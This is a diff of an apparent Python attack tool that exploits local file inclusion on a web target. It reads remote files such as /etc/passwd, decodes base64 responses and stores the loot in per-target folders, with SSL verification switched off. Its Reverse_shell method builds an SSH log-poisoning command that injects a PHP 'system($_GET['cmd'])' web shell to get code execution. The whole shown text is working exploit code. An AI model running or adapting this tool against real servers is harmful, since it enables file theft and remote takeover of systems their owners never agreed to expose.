@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-
 #!/usr/bin/env python
 import urllib.response
 import time
@@ -13,6 +11,7 @@ import os
 import subprocess
 import base64
 ssl._create_default_https_context = ssl._create_unverified_context  
+
 class Read_File:
      def __init__(self):
             self.control()
@@ -100,6 +99,10 @@ class Read_File:
                                  ('password','password')]
             first_req = request.open(self.args.Vulnurl).read()                                                      
             Get_Oregnal_URL = request.open(self.url).read() 
+            ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
+            [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.url)#).strip()
+            if not os.path.exists('./FileStore/'+ip_re.group()+"/"):
+               os.makedirs('./FileStore/'+ip_re.group()+"/") 
             print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
             print("[+] File request        : ................ | : "+command.replace('\n','')) 
             print("[+] Full Path           : ................ | : "+self.url.replace('\n','')) 
@@ -126,24 +129,32 @@ class Read_File:
                           html.write(str(Get_Oregnal_URL).replace("b'",''))
                    
             elif not self.args.auth and len(Get_Oregnal_URL) != len(first_req)  :
-                         with open('./index3.htnl','w') as html:
+                       
+                         if os.path.exists('./FileStore/'+ip_re.group()+'/'+self.args.read.replace('/','',1).replace('/','_')):  
+                            os.remove('./FileStore/'+ip_re.group()+'/'+self.args.read.replace('/','',1).replace('/','_'))  
+                         with open('./FileStore/'+ip_re.group()+'/index3.htnl','w') as html:
                               html.write(str(Get_Oregnal_URL).replace("b'",''))
-                         with open ('./index3.htnl','r') as read :
+                         with open ('./FileStore/'+ip_re.group()+'/index3.htnl','r') as read :
                               if self.args.base64 :
                                  read_out = str(read.readlines()).split('<')
                                  decoded64 = str(base64.b64decode(read_out[0]))
                                  decoded64 = decoded64 .split('\\n')
                                  for line in  decoded64 :
                                       line = str(line).replace("'",'').replace("[",'')
-                                      with open('passwd.txt','a') as passwd:
-                                          passwd.write(line.replace('b','',1)+'\n')             
+                                      with open('./FileStore/'+ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_1:
+                                          File_1.write(line.replace('b','',1).replace('\\','')+'\n')
+                                          if os.path.exists('./FileStore/'+ip_re.group()+'/index3.htnl'):
+                                             os.remove('./FileStore/'+ip_re.group()+'/index3.htnl')               
                               else:
                                    read_out = str(read.readlines()).split('<')
                                    read_out=read_out[0].split('\\n')
                                    for line in read_out:
                                        line = str(line).replace("'",'').replace("[",'')
-                                       with open('passwd.txt','a') as passwd:
-                                            passwd.write(line[:-1]+'\n')                                                                 
+                                       with open('./FileStore/'+ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_1:
+                                            File_1.write(line.replace('b','',1).replace('\\','')+'\n') 
+                                            if os.path.exists('./FileStore/'+ip_re.group()+'/index3.htnl'):
+                                               os.remove('./FileStore/'+ip_re.group()+'/index3.htnl')   
+                                                                                           
      def Reverse_shell(self):
                  if 'log' in self.url :
                     order2 = '''ssh '<?php system($_GET['cmd']); ?>'@192.168.56.107'''
